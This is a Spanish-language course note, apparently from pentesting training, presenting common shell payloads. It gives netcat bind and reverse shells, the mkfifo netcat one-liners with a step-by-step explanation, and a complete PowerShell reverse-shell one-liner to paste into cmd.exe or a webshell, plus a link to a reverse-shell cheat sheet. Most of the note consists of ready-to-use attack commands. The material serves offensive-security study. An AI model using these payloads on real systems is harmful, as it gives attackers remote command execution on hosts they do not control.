Dentro de poco veremos cómo generar payloads con msfvenom, pero antes de eso echemos un vistazo a algunos payloads comunes usando las herramientas que hemos visto.

----------------------------------------
En algunas versiones de netcat, hay una opción `-e` que permite ejecutar un proceso en conexión, por ejemplo:

`nc -lvnp <puerto> -e /bin/bash`

Conectarse al listener de arriba tendría como resultado una bind shell en el objetivo.

Igualmente, conectarse de vuelta a `nc <ip_local> <puerto> -e /bin/bash` resultaría en una reverse shell en el objetivo.

 En Windows, donde se requiere un binario estático, esta técnica funcionaría perfectamente. Sin embargo, en Linux usaríamos el siguiente código para crear un listener para una bind shell:
 
`mkfifo /tmp/f; nc -lvnp <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Este comando:

1. Primero crea una "named pipe", que es un método de comunicación bidireccional entre procesos, en `/tmp/f`.
2. Luego crea un listener netcat y conecta el input del listener al output de la named pipe.
3. El output del listener se pipea (redirige) hacia `sh`, mandando el output estándar de errores (stderr) a stdout.
4. Manda stdout por el input de la named pipe, completando el círculo.

![[Pasted image 20251124230612.png]]

Un comando muy similar puede ser usado para mandar una reverse shell de netcat:

`mkfifo /tmp/f; nc <ip_local> <puerto> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

Este comando es virtualmente idéntico al de arriba (menos por usar la sintaxis de listen de netcat).

![[Pasted image 20251124230849.png]]

----------------------------------
Al atacar Server de Windows moderno, es muy común necesitar una reverse shell de Powershell, así que lo cubriremos ahora (PSH reverse shell en una línea).

Este comando es muy complejo por lo que no veremos aquí su funcionamiento. Sin embargo, es útil tenerlo a mano.

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

Para usarlo debemos reemplazar `<IP>` y `<port>`. Después lo copiamos a una cmd.exe u otras formas de ejecutar comandos en un Windows Server, como webshell. Por último lo ejecutamos.

![[Pasted image 20251124231408.png]]

---------------------------------------
Para más payloads de reverse shell, puedes visitar [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Es un repositorio que contiene muchas en varios lenguajes.